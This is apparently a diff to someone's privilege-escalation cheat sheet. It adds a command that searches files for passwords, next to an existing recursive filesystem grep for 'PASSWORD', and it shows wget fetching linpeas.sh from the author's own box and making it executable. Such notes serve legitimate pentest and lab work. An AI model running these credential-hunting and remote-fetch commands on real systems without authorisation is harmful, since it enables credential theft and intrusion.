@@ -42,6 +42,8 @@ ss -tulpn
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
 +this will put out A LOT of stuff so make the query better with "password=" || "secret=" or something...
 
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
 ### SCRIPTS I THEN RUN ###
 wget http://my.box.ip.addr:port/linpeas.sh -O linpeas.sh
 chmod +x linpeas.sh
